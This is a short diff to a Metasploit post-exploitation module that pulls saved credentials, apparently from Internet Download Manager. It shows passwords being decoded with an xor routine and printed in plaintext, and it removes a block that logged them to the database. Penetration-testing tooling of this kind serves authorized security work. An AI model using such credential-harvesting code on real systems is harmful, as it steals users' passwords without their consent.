@@ -58,17 +58,6 @@ class Metasploit3 < Msf::Post
 					next if epass == nil or epass == ""
 					pass = xor(epass)
 					print_good("Site: #{site} (User=#{user}, Password=#{pass})")
-
-					#Report auth information
-					auth = {
-						:host  => site,
-						:sname => 'idm',
-						:user  => user,
-						:pass  => epass,
-						:type  => 'password',
-					}
-
-					report_auth_info(auth)
 				end
 			rescue ::Exception => e
 				print_error("An error has occured: #{e.to_s}")
